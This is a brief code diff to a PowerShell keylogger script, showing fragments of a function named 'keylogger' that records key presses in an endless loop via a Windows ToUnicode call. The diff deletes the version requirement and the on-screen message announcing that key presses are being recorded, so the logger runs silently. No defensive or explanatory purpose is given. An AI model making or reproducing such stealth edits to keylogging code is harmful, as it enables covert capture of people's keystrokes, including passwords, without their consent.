@@ -1,4 +1,3 @@
-#requires -Version 2
 function keylogger{
   $set = "abcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
   $word += "\"
@@ -29,8 +28,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
   try
   {
-    Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
-
     # create endless loop. When user presses CTRL+C, finally-block
     # executes and shows the collected key presses
     while ($true) {
